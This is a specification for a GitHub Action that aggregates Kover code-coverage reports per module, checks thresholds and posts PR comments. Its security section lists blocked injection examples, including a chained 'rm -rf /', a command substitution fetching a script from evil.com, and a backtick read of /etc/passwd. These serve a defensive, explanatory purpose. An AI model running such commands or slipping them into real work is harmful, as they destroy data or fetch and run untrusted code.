# Kover Report Action - Specification

## Overview

A generalized GitHub Action for generating and reporting code coverage from Kover XML reports with multi-module support. This action is designed to work with any Kotlin/Android project using Kover for code coverage.

## Design Goals

1. **Multi-Module Support**: Handle projects with multiple modules and aggregate coverage
2. **Flexible Discovery**: Support command-based module discovery (Gradle) and glob patterns
3. **Configurable Thresholds**: Per-module type and per-module name threshold configuration
4. **PR Integration**: Post coverage reports as PR comments with automatic updates
5. **Backward Compatible**: Easy migration from the reference implementation (omnitweety-android)
6. **Extensible**: Modular design allowing future enhancements (history tracking, trends)

## Reference Implementation

Based on: `omnitweety-android/.github/actions/coverage-report`

**Key Differences:**
- Generalized module discovery (not Gradle-specific)
- Configurable path templates (not hardcoded)
- Simplified architecture for easier maintenance
- Optional features via feature flags

## Architecture

### Module Structure

```
src/
├── index.ts           # Main orchestration and workflow
├── discovery.ts       # Module discovery (command-based + glob)
├── paths.ts           # Path resolution and module name normalization
├── parser.ts          # Kover XML parsing
├── aggregator.ts      # Multi-module aggregation logic
├── threshold.ts       # Threshold matching (type + name)
├── report.ts          # Markdown report generation
└── github.ts          # PR comment posting
```

### Data Flow

```
Input: discovery-command or coverage-files
  ↓
[Module Discovery] → List of module names
  ↓
[Path Resolution] → module-path-template → List of XML file paths
  ↓
[XML Parsing] → Per-module coverage data
  ↓
[Threshold Matching] → Per-module pass/fail status
  ↓
[Aggregation] → Overall coverage + module breakdown
  ↓
[Report Generation] → Markdown table
  ↓
[PR Comment] → Post/update GitHub PR comment
  ↓
Output: coverage-percentage, module-coverage-json
```

## Inputs

### Discovery & Paths

| Input | Description | Default | Required |
|-------|-------------|---------|----------|
| `discovery-command` | Command to discover modules (e.g., `./gradlew -q projects`) | - | No |
| `coverage-files` | Glob pattern for coverage files (alternative to discovery-command) | `**/build/reports/kover/report.xml` | No |
| `module-path-template` | Path template for module coverage files (use `{module}` placeholder) | `{module}/build/reports/kover/report.xml` | No |
| `ignore-modules` | Comma-separated list of modules to ignore | `''` | No |

**Discovery Mode Logic:**
- If `discovery-command` is provided → Use command-based discovery
- Else → Use glob pattern from `coverage-files`

### Thresholds

| Input | Description | Default | Required |
|-------|-------------|---------|----------|
| `thresholds` | JSON object with module type/name thresholds | `{"default": 60}` | No |
| `min-coverage` | Global minimum coverage (fallback if thresholds not specified) | `0` | No |

**Threshold Format:**
```json
{
  "core": 80,              // Type-based: all :core:* modules
  "data": 75,              // Type-based: all :data:* modules
  "feature": 70,           // Type-based: all :feature:* modules
  ":core:testing": 0,      // Name-based: specific module override
  "default": 60            // Fallback for unmatched modules
}
```

**Threshold Validation Rules:**
- Values must be numbers (integers or decimals)
- Range: 0-100 (inclusive)
- Values < 0 or > 100 are rejected with error
- Decimals are allowed (e.g., `85.5` is valid)
- Keys must be either:
  - Module type (no leading `:`, e.g., `"core"`)
  - Full module name (with leading `:`, e.g., `":core:testing"`)
  - Reserved word: `"default"`
- Invalid JSON format causes fatal error
- Empty object `{}` is valid (all modules use `min-coverage` or hard default 0)

**Threshold Matching Order:**
1. Exact module name match (e.g., `:core:testing`)
2. Module type match (extract first segment after `:`, e.g., `core`)
3. `default` value
4. `min-coverage` input
5. Hard default: `0`

### Reporting

| Input | Description | Default | Required |
|-------|-------------|---------|----------|
| `github-token` | GitHub token for PR comments | - | No |
| `title` | Report title | `Code Coverage Report` | No |
| `enable-pr-comment` | Post report as PR comment | `true` | No |

### Advanced

| Input | Description | Default | Required |
|-------|-------------|---------|----------|
| `debug` | Enable debug logging | `false` | No |

## Outputs

| Output | Description | Example |
|--------|-------------|---------|
| `coverage-percentage` | Overall coverage percentage | `85.5` |
| `instructions-covered` | Total instructions covered across all modules | `1234` |
| `instructions-total` | Total instructions across all modules | `1500` |
| `modules-coverage-json` | JSON object with per-module coverage | `{":core:common": 80.5, ":data": 75.2}` |
| `modules-below-threshold` | Comma-separated list of modules below threshold | `:feature:auth,:feature:share` |

**Note on Instructions vs Lines:** This action uses INSTRUCTION coverage (JaCoCo metric) which counts bytecode instructions rather than source lines. INSTRUCTION coverage is more granular and accurate than LINE coverage. The output names use "instructions" to clearly indicate this metric.

## Module Name Normalization

**Canonical Format:** All module names are stored internally with the format `:module:submodule` (with leading colon).

**Examples:**
- `:app` - Single-level module
- `:core:common` - Two-level module
- `:feature:auth:ui` - Three-level module

**Normalization Rules:**
1. **Always has leading colon** - `:module` not `module`
2. **Segments separated by colons** - `:core:common` not `:core/common`
3. **No trailing colon** - `:app` not `:app:`
4. **No empty segments** - `:core:common` not `::core:common`

**Edge Cases:**
- Empty string → Error (invalid module name)
- `module` (no leading `:`) → Normalized to `:module`
- `:module:` (trailing `:`) → Normalized to `:module`
- `::module` (double colon) → Error (invalid format)
- `:module with spaces` → Allowed (preserved as-is)
- `:module@123` → Allowed (special characters preserved)

**Path Conversion for File System:**

When resolving module names to file paths, use this transformation:
```typescript
// Module name → File path
":core:common" → "core/common"
":app" → "app"
":feature:auth:ui" → "feature/auth/ui"

// Transformation steps:
1. Remove leading ":"
2. Replace all ":" with "/"
```

**Path-to-Module Conversion (Glob Discovery):**
```typescript
// File path → Module name
"core/common/build/reports/kover/report.xml" → ":core:common"
"app/build/reports/kover/report.xml" → ":app"

// Transformation steps:
1. Remove known suffix pattern (e.g., "/build/reports/kover/report.xml")
2. Add leading ":"
3. Replace all "/" with ":"
```

## Module Discovery

### Command-Based Discovery

**Input:**
```yaml
discovery-command: './gradlew -q projects'
module-path-template: '{module}/build/reports/kover/report.xml'
```

**Expected Command Output Format:**
```
Root project 'myapp'
+--- Project ':app'
+--- Project ':core:common'
+--- Project ':core:testing'
+--- Project ':data:repository'
\--- Project ':feature:auth'
```

**Parsing Logic:**
1. Execute command via `@actions/exec` (without shell expansion for security)
2. Parse stdout line by line
3. Extract module names using regex: `/Project '([^']+)'/`
4. Filter out lines matching `Root project`
5. Normalize extracted names to canonical format (add leading `:` if missing)
6. Return array of module names: `[':app', ':core:common', ...]`

**Path Resolution:**
For each discovered module, resolve its coverage file path:
- Module name (canonical): `:core:common`
- Template: `{module}/build/reports/kover/report.xml`
- Transform module for path: `:core:common` → `core/common`
- Replace `{module}` in template: `core/common/build/reports/kover/report.xml`

**Command Validation (Security):**
- Command executed via `@actions/exec` without shell (prevents injection)
- Shell features NOT supported: `|`, `&&`, `||`, `$()`, backticks, redirects
- Environment variables in command string are NOT expanded
- Only the command and its arguments are executed directly

**Safe commands:**
- ✅ `./gradlew -q projects`
- ✅ `./gradlew projects --console=plain`
- ✅ `gradle projects`

**Unsafe patterns (will fail):**
- ❌ `./gradlew projects | grep feature` (pipe not supported)
- ❌ `./gradlew projects && echo done` (chaining not supported)
- ❌ `$(cat malicious.sh)` (command substitution not supported)

### Glob-Based Discovery

**Input:**
```yaml
coverage-files: '**/build/reports/kover/report.xml'
```

**Note:** When using glob-based discovery, the `module-path-template` input is **ignored** since file paths are already known.

**Processing:**
1. Use glob library to find all matching files
2. Extract module name from each file path (reverse path-to-module transformation)
3. Normalize to canonical format (`:module:name`)
4. Return array of `{module, filePath}` pairs

**Module Name Extraction:**

The action attempts to extract module names by removing common suffix patterns:

**Strategy 1: Match against expected patterns**
```typescript
// Expected patterns (tried in order):
[
  '/build/reports/kover/report.xml',
  '/build/reports/kover/*.xml',
  '/kover/report.xml',
  '/report.xml'
]

// Example:
"core/common/build/reports/kover/report.xml"
→ Remove "/build/reports/kover/report.xml"
→ Remaining: "core/common"
→ Normalize: ":core:common"
```

**Strategy 2: User-defined suffix (Future Enhancement)**
```yaml
# Proposed future input:
module-path-suffix: '/build/reports/kover/report.xml'
```

**Strategy 3: Extract from glob pattern**
```yaml
# Pattern: '**/module-name/build/reports/kover/report.xml'
# Identify which segment is the module name based on wildcards
```

**Limitations:**
- If glob matches files with inconsistent structure, extraction may fail
- Parent module directories without coverage files won't be discovered
- Ambiguous paths may be incorrectly parsed

**Recommendation:** Use command-based discovery for complex multi-module projects. Use glob-based discovery for simple projects with consistent path structure.

## Module Type Classification

**Purpose:** Extract module type from module name for type-based threshold matching.

**Logic:**
```typescript
function getModuleType(moduleName: string): string {
  // Input: ":core:testing"
  // Split by ":" and filter empty strings: ["core", "testing"]
  const parts = moduleName.split(':').filter(Boolean);

  // Return first part: "core"
  return parts.length > 0 ? parts[0] : 'default';
}
```

**Examples:**
- `:core:common` → `core`
- `:core:testing` → `core`
- `:data:repository` → `data`
- `:feature:auth` → `feature`
- `:app` → `app`

## XML Parsing

**Format:** Kover XML (JaCoCo-compatible format)

**Target Metric:** INSTRUCTION coverage (most granular)

**XML Structure:**
```xml
<report name="Kover report">
  <counter type="INSTRUCTION" missed="150" covered="850"/>
  <counter type="LINE" missed="50" covered="200"/>
  <counter type="BRANCH" missed="20" covered="80"/>
</report>
```

**Parsing Logic:**
1. Read XML file using `fs.readFile()`
2. Parse with `fast-xml-parser`
3. Find counter with `type="INSTRUCTION"`
4. Extract `missed` and `covered` attributes
5. Calculate: `total = missed + covered`, `percentage = (covered / total) * 100`

**Error Handling:**
- File not found → Return `null` (expected for parent modules)
- Invalid XML → Log warning, return `null`
- Missing INSTRUCTION counter → Log warning, return `null`

**Return Type:**
```typescript
interface CoverageResult {
  covered: number;    // Number of covered instructions
  missed: number;     // Number of missed instructions
  total: number;      // Total instructions (covered + missed)
  percentage: number; // Coverage percentage (0-100)
}
```

## Aggregation

**Purpose:** Combine per-module coverage into overall coverage.

**Formula:**
```
Overall Coverage = (Sum of all covered) / (Sum of all total) * 100
```

**Example:**
- Module A: 800 covered / 1000 total (80%)
- Module B: 150 covered / 500 total (30%)
- Overall: (800 + 150) / (1000 + 500) = 950 / 1500 = 63.3%

**Important:** Overall coverage is NOT the average of module percentages. It's weighted by module size.

**Handling Modules with Missing Coverage:**

Modules that return `null` coverage (file not found or invalid) are handled as follows:

1. **Excluded from overall calculation:** Only modules with valid coverage contribute to the overall percentage
2. **Shown in report:** Displayed with "N/A" coverage and ⚠️ status
3. **Not counted as failures:** Missing coverage does not cause threshold failure

**Example with missing coverage:**
- Module A: 800 covered / 1000 total (80%) - ✅ Passes (threshold 70%)
- Module B: null (file not found) - ⚠️ Warning
- Module C: 300 covered / 500 total (60%) - ❌ Fails (threshold 70%)
- **Overall: (800 + 300) / (1000 + 500) = 1100 / 1500 = 73.3%**

Note: Module B's missing coverage doesn't contribute zero values; it's completely excluded from the calculation.

## Parent Modules

**Definition:** Parent modules are container modules that don't contain source code themselves but organize child modules. Examples: `:core`, `:feature`, `:data`.

**Identification:** A module is considered a parent module if:
- Its coverage file does not exist
- It typically appears in the module hierarchy but has no actual code
- Child modules exist (e.g., `:core:common`, `:core:testing` are children of `:core`)

**Handling Strategy:**

**Option A (Recommended): Include in Discovery, Mark as N/A**
- Parent modules discovered by command-based discovery are **included** in the module list
- Coverage file lookup returns `null` (file not found)
- Shown in report with "N/A" coverage and ⚠️ status
- Not counted in overall coverage calculation
- Threshold check: If threshold is 0, shows ⚠️; if threshold > 0, shows ⚠️ (not ❌)

**Benefits:**
- Complete visibility of project structure
- Users can set threshold=0 for parent modules explicitly
- Clear indication of which modules are containers

**Example Report:**
```
| Module           | Coverage | Threshold | Status |
|------------------|----------|-----------|--------|
| :core            | N/A      | 0%        | ⚠️     |
| :core:common     | 85.5%    | 80%       | ✅     |
| :core:testing    | 92.0%    | 80%       | ✅     |
| :data            | N/A      | 0%        | ⚠️     |
| :data:repository | 78.2%    | 75%       | ✅     |
```

**Ignoring Parent Modules:**

To hide parent modules from the report, add them to `ignore-modules`:
```yaml
ignore-modules: ':core,:data,:feature'
```

This is useful for keeping reports focused on leaf modules only.

## Threshold Checking

**Per-Module Check:**
1. Get threshold for module (exact name → type → default)
2. If coverage is `null` (file not found):
   - Always show ⚠️ status (warning, not failure)
   - Does not count as threshold failure
   - Logged as warning in action output
3. If coverage exists:
   - Compare `coverage >= threshold`
   - Mark as pass (✅) if coverage meets or exceeds threshold
   - Mark as fail (❌) if coverage below threshold

**Missing Coverage Threshold Behavior:**

Modules with missing coverage files (null coverage) are treated specially:

| Threshold | Coverage | Status | Reason |
|-----------|----------|--------|--------|
| 0% | null | ⚠️ | Warning (expected for parent modules) |
| 50% | null | ⚠️ | Warning (cannot verify, don't fail) |
| 80% | null | ⚠️ | Warning (cannot verify, don't fail) |

**Rationale:** Missing coverage files are often expected (parent modules, build-logic modules, etc.). Failing the action for missing files would be too strict and cause false negatives.

**Overall Check:**
1. Calculate overall coverage from all modules with valid coverage (exclude null)
2. Compare overall coverage against `min-coverage` input
3. If overall < min-coverage → Fail action with `core.setFailed()`
4. Modules with null coverage do NOT affect this check (they're excluded from calculation)

**Ignore Modules:**
- Modules in `ignore-modules` input are excluded from discovery entirely
- Format: Comma-separated list (`:core,:core:testing,:build-logic`)
- Normalization: Add leading `:` if missing (e.g., `core` → `:core`)
- Ignored modules:
  - Not discovered (won't appear in module list)
  - Not parsed (coverage files not read)
  - Not shown in report
  - Not counted in overall coverage

## Report Format

### Console Output

```
📊 Coverage Report

Overall Coverage: 63.3%

Module Coverage:
┌─────────────────────┬──────────┬───────────┬────────┐
│ Module              │ Coverage │ Threshold │ Status │
├─────────────────────┼──────────┼───────────┼────────┤
│ :core:common        │ 85.5%    │ 80%       │ ✅     │
│ :core:testing       │ N/A      │ 0%        │ ⚠️      │
│ :data:repository    │ 78.2%    │ 75%       │ ✅     │
│ :feature:auth       │ 65.8%    │ 70%       │ ❌     │
└─────────────────────┴──────────┴───────────┴────────┘

Legend:
✅ Coverage meets threshold
❌ Coverage below threshold
⚠️  No coverage report found
```

### PR Comment (Markdown)

````markdown
## 📊 Code Coverage Report

**Overall Coverage: 63.3%**

### Module Coverage

| Module | Coverage | Threshold | Status |
|--------|----------|-----------|--------|
| :core:common | 85.5% | 80% | ✅ |
| :core:testing | N/A | 0% | ⚠️ |
| :data:repository | 78.2% | 75% | ✅ |
| :feature:auth | 65.8% | 70% | ❌ |

### Legend
- ✅ Coverage meets threshold
- ❌ Coverage below threshold
- ⚠️ No coverage report found

---

_Generated by [kover-report-action](https://github.com/yshrsmz/kover-report-action)_
````

**Comment Management:**
- Use HTML comment identifier: `<!-- kover-coverage-report -->`
- Search for existing comment in PR
- If found → Update existing comment
- If not found → Create new comment
- Prevents comment spam on multiple runs

**Size Limits:**
- GitHub API comment size limit: ~65,536 characters
- If report exceeds limit (e.g., 100+ modules):
  - Action logs warning
  - Consider using `ignore-modules` to reduce size
  - Future: Collapsible sections for large reports (Phase 4)

## Error Handling

### Fatal Errors (Fail Action)

1. **Invalid threshold JSON:** Cannot parse `thresholds` input
2. **Discovery command failed:** Command exits with non-zero code
3. **No modules found:** Discovery returns empty list
4. **Coverage below minimum:** Overall coverage < `min-coverage`

### Warnings (Log but Continue)

1. **Module coverage file not found:** Expected for parent modules, test-only modules
2. **Invalid XML structure:** File exists but malformed
3. **Missing INSTRUCTION counter:** XML valid but missing expected data
4. **PR comment failed:** Network error or permission issue (don't fail action)

### Debug Mode

When `debug: 'true'`:
- Log discovery command output
- Log each module's coverage file path
- Log threshold matching decisions
- Log module type extraction
- Log parsed XML structure

## Security Considerations

### 1. Command Injection Prevention

**Risk:** Malicious `discovery-command` input could execute arbitrary code.

**Mitigation:**
- Use `@actions/exec.exec()` which does NOT use shell by default
- Command and arguments parsed directly (no shell interpretation)
- Shell metacharacters are treated as literal strings (not executed)

**What's blocked:**
```yaml
# ❌ These patterns do NOT work (shell features disabled):
discovery-command: './gradlew projects | grep feature'  # Pipe ignored
discovery-command: './gradlew projects && rm -rf /'     # && treated as argument
discovery-command: '$(curl evil.com/script.sh)'         # $() not expanded
discovery-command: '`cat /etc/passwd`'                  # Backticks not expanded
discovery-command: './gradlew projects > /tmp/out'      # Redirect ignored
```

**What's safe:**
```yaml
# ✅ These commands are safe:
discovery-command: './gradlew -q projects'
discovery-command: './gradlew projects --console=plain'
discovery-command: 'gradle projects'
```

**Additional validation:**
- Command must be non-empty string
- No validation of command existence (exec will fail with clear error)
- Stdout/stderr captured separately for security

### 2. Path Traversal Prevention

**Risk:** Malicious module names or paths could read files outside project directory.

**Mitigation:**
- Validate resolved paths stay within workspace
- Reject paths containing `..` segments
- Normalize paths before reading files
- Use `path.resolve()` and `path.normalize()` for all file operations

**Example checks:**
```typescript
// Safe path resolution
const workspace = process.env.GITHUB_WORKSPACE || process.cwd();
const resolvedPath = path.resolve(workspace, modulePath);

// Verify path is within workspace
if (!resolvedPath.startsWith(workspace)) {
  throw new Error('Path traversal detected');
}
```

### 3. Token Exposure Prevention

**Risk:** `github-token` leaked in logs, error messages, or outputs.

**Mitigation:**
- Use `core.setSecret(token)` immediately after reading input
- GitHub Actions automatically masks secrets in logs
- Never include token in error messages
- Never include token in outputs or reports
- Never log token value (even in debug mode)

**Safe usage:**
```typescript
const token = core.getInput('github-token');
if (token) {
  core.setSecret(token);  // Mask in all future logs
}
```

### 4. Required Permissions

**For basic coverage checking:**
```yaml
permissions:
  contents: read  # Default permission
```

**For PR comments:**
```yaml
permissions:
  contents: read
  pull-requests: write  # Required for posting/updating comments
```

**Security note:** Action fails gracefully if permissions are insufficient. PR comment failures log warnings but don't fail the action.

### 5. Dependency Security

**Mitigation:**
- Pin all dependencies to specific versions
- Regular security audits with `npm audit`
- Use Dependabot for automated updates
- Minimal dependency footprint
- Only use well-maintained, popular packages

### 6. XML Parsing Security

**Risk:** Malicious XML files could cause DoS (XML bombs, billion laughs attack).

**Mitigation:**
- Use `fast-xml-parser` with safe defaults
- Set size limits for XML files (max 10MB)
- Disable external entity expansion (XXE prevention)
- Timeout for parsing operations

**Safe parser configuration:**
```typescript
const parserOptions = {
  ignoreAttributes: false,
  parseAttributeValue: true,
  // Security: disable external entities
  allowBooleanAttributes: false,
  processEntities: false,
};
```

## Performance Considerations

1. **Parallel XML Parsing:** Parse module coverage files concurrently
2. **Glob Performance:** Use efficient glob patterns (avoid `**/**/**`)
3. **API Rate Limits:** Batch PR comment updates (1 per run, not per module)
4. **Large Projects:** Stream large XML files instead of loading into memory

## Backward Compatibility

### Migration from Reference Action

**Before (omnitweety-android):**
```yaml
- uses: ./.github/actions/coverage-report
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    gradle-command: './gradlew -q projects'
    thresholds: '{"core": 80, "data": 75, "feature": 70, "default": 60}'
    ignore-modules: ':core,:core:testing,:data,:feature,:build-logic'
```

**After (kover-report-action):**
```yaml
- uses: yshrsmz/kover-report-action@v1
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    discovery-command: './gradlew -q projects'
    module-path-template: '{module}/build/reports/kover/report.xml'
    thresholds: '{"core": 80, "data": 75, "feature": 70, "default": 60}'
    ignore-modules: ':core,:core:testing,:data,:feature,:build-logic'
```

**Changes:**
- `gradle-command` → `discovery-command` (renamed for clarity)
- Added `module-path-template` (was hardcoded)
- No other breaking changes

## Future Enhancements (Not in MVP)

### Phase 4: Coverage History

- Store coverage data in GitHub artifacts
- Compare against baseline (main branch)
- Show trend indicators (↑↓→)
- ASCII trend graphs
- Configurable retention

**New Inputs:**
```yaml
enable-history: 'true'
history-retention: '50'
default-branch: 'main'
```

### Phase 5: Advanced Features

- Branch coverage support (in addition to INSTRUCTION)
- Multiple format support (JaCoCo XML, Cobertura)
- Coverage badges generation
- Webhook notifications
- SonarQube/Codecov integration

## Non-Goals

1. **HTML Report Generation:** Kover already generates HTML reports
2. **Test Execution:** Action assumes tests have already run
3. **Multi-Repository Support:** Action works on single repository
4. **Coverage Collection:** Action parses existing reports, doesn't collect coverage

## Success Criteria

### MVP (Phase 1-2)

- ✅ Parse Kover XML reports
- ✅ Support command-based module discovery
- ✅ Support glob-based discovery
- ✅ Calculate per-module and overall coverage
- ✅ Apply per-module thresholds (type + name)
- ✅ Generate Markdown report
- ✅ Post PR comments
- ✅ Handle missing coverage files gracefully
- ✅ Pass/fail action based on thresholds

### Quality Gates

- ✅ No hardcoded paths or module names
- ✅ Comprehensive error handling
- ✅ Debug logging support
- ✅ Clear documentation
- ✅ Example workflows for common scenarios
- ✅ Migration guide from reference action

## Example Workflows

### Example 1: Simple Single Module

```yaml
- name: Run tests with coverage
  run: ./gradlew koverXmlReport

- name: Check coverage
  uses: yshrsmz/kover-report-action@v1
  with:
    coverage-files: 'build/reports/kover/report.xml'
    min-coverage: '70'
```

### Example 2: Multi-Module with Gradle Discovery

```yaml
- name: Run tests with coverage
  run: ./gradlew koverXmlReport

- name: Generate coverage report
  uses: yshrsmz/kover-report-action@v1
  with:
    discovery-command: './gradlew -q projects'
    module-path-template: '{module}/build/reports/kover/report.xml'
    thresholds: '{"core": 80, "feature": 70, "default": 60}'
    ignore-modules: ':app,:build-logic'
    github-token: ${{ secrets.GITHUB_TOKEN }}
```

### Example 3: Multi-Module with Glob Pattern

```yaml
- name: Run tests with coverage
  run: ./gradlew koverXmlReport

- name: Generate coverage report
  uses: yshrsmz/kover-report-action@v1
  with:
    coverage-files: '**/build/reports/kover/report.xml'
    thresholds: '{"default": 65}'
    github-token: ${{ secrets.GITHUB_TOKEN }}
```

## Troubleshooting

### Issue: "No modules found"

**Symptoms:**
- Action fails with error: "No modules found"
- Discovery returns empty array

**Possible Causes & Solutions:**

1. **Command-based discovery:**
   ```yaml
   # Check command output format
   - Run: ./gradlew -q projects
   # Expected output must contain: Project ':module-name'
   ```
   - Verify command outputs module names in expected format
   - Check command exits with code 0 (success)
   - Enable debug mode to see raw command output

2. **Glob-based discovery:**
   ```yaml
   # Check file pattern matches files
   - Run: ls -la **/build/reports/kover/report.xml
   ```
   - Verify coverage files exist at expected paths
   - Check glob pattern syntax (use `**` for recursive)
   - Ensure files are committed (if running in CI)

3. **All modules ignored:**
   - Check `ignore-modules` input doesn't exclude all modules
   - Verify normalization (`:module` vs `module`)

### Issue: "Invalid threshold JSON"

**Symptoms:**
- Action fails immediately with JSON parse error

**Solutions:**
1. Validate JSON syntax (use https://jsonlint.com)
2. Escape quotes properly in YAML:
   ```yaml
   # ✅ Correct:
   thresholds: '{"core": 80, "default": 60}'

   # ❌ Wrong:
   thresholds: {"core": 80, "default": 60}  # Parsed as YAML, not JSON string
   ```
3. Check for trailing commas (invalid in JSON)
4. Ensure values are 0-100 range

### Issue: "Coverage file not found" warnings

**Symptoms:**
- Warnings in logs: "Coverage file not found for module :xyz"
- Modules show "N/A" in report

**Expected for:**
- Parent modules (`:core`, `:feature`, `:data`)
- Build-logic modules
- Modules without tests

**Solutions:**
1. **If expected:** Add to `ignore-modules` to hide from report
   ```yaml
   ignore-modules: ':core,:data,:feature,:build-logic'
   ```

2. **If unexpected:** Verify coverage generated
   ```bash
   # Check file exists
   ls -la module/build/reports/kover/report.xml

   # Verify Kover task ran
   ./gradlew :module:koverXmlReport
   ```

3. **Check path template:**
   ```yaml
   # Ensure template matches actual file locations
   module-path-template: '{module}/build/reports/kover/report.xml'
   ```

### Issue: "PR comment not posted"

**Symptoms:**
- No comment appears on PR
- Warning logged but action succeeds

**Solutions:**

1. **Check permissions:**
   ```yaml
   permissions:
     contents: read
     pull-requests: write  # ← Must be present
   ```

2. **Verify token provided:**
   ```yaml
   with:
     github-token: ${{ secrets.GITHUB_TOKEN }}  # ← Must be set
   ```

3. **Check event type:**
   - Comments only posted on `pull_request` events
   - Not posted on `push` events (expected behavior)

4. **Network/API errors:**
   - Check GitHub API status
   - Review action logs for specific error messages
   - Temporary failures don't fail the action

### Issue: "Action fails but coverage seems OK"

**Symptoms:**
- Action fails with `core.setFailed()`
- Coverage appears to meet requirements

**Possible Causes:**

1. **Overall coverage below `min-coverage`:**
   ```yaml
   # Check min-coverage setting
   min-coverage: '70'  # Overall must be >= 70%
   ```
   - Individual modules can pass but overall fails
   - Review overall coverage in logs

2. **Discovery command failed:**
   - Command exited with non-zero code
   - Check command runs successfully locally
   - Review stderr output in debug mode

3. **Invalid inputs:**
   - Threshold values out of range (< 0 or > 100)
   - Malformed JSON in thresholds
   - Invalid module names

### Issue: "Module type threshold not applied"

**Symptoms:**
- Expected type-based threshold not used
- Module uses default threshold instead

**Solutions:**

1. **Check threshold key format:**
   ```json
   {
     "core": 80,        // ✅ Correct (no leading colon for type)
     ":core": 80,       // ❌ Wrong (this matches module named ":core" exactly)
     "default": 60
   }
   ```

2. **Verify module type extraction:**
   - Module `:core:common` → type is `core`
   - Module `:core:testing` → type is `core`
   - Enable debug mode to see threshold matching

3. **Check priority order:**
   - Exact name match overrides type match
   - Example: `":core:testing": 0` overrides `"core": 80`

### Issue: "Path traversal detected"

**Symptoms:**
- Action fails with path traversal error
- Module paths contain `..`

**Causes:**
- Malicious or malformed module names
- Incorrect path template

**Solutions:**
1. Verify module names are valid
2. Check discovery command output
3. Use relative paths from workspace root
4. Report if you believe this is a false positive

### Issue: "Command injection detected"

**Symptoms:**
- Discovery command fails to execute
- Pipes, redirects, or shell features not working

**Expected Behavior:**
- Shell features are intentionally disabled for security
- Only direct command execution supported

**Solutions:**
1. Use command without shell features:
   ```yaml
   # ✅ Use this:
   discovery-command: './gradlew -q projects'

   # ❌ Not this:
   discovery-command: './gradlew projects | grep feature'
   ```

2. Pre-process output in separate step:
   ```yaml
   - name: Discover modules
     run: ./gradlew -q projects | grep feature > modules.txt

   - name: Coverage report
     uses: yshrsmz/kover-report-action@v1
     with:
       coverage-files: '**/kover/report.xml'
   ```

### Issue: "Large PR comment truncated"

**Symptoms:**
- PR comment seems incomplete
- Many modules not shown

**Cause:**
- GitHub comment size limit (~65KB)
- Project has 100+ modules

**Solutions:**
1. Use `ignore-modules` to exclude parent modules
2. Consider splitting into multiple reports
3. Future: Collapsible sections (Phase 4)

### Getting More Information

**Enable debug mode:**
```yaml
with:
  debug: 'true'
```

This logs:
- Discovery command output
- Each module's coverage file path
- Threshold matching decisions
- Module type extraction
- Parsed XML structure

**Check action logs:**
- Review complete action output in GitHub Actions UI
- Look for specific error messages and warnings
- Check for stack traces (report as bugs)

**Report issues:**
- GitHub Issues: https://github.com/yshrsmz/kover-report-action/issues
- Include: action version, debug logs, minimal reproduction

## References

- [Kover Documentation](https://kotlin.github.io/kotlinx-kover/)
- [JaCoCo XML Format](https://www.jacoco.org/jacoco/trunk/doc/xml.html)
- [GitHub Actions Toolkit](https://github.com/actions/toolkit)
- [Reference Implementation](https://github.com/yshrsmz/omnitweety-android/.github/actions/coverage-report)
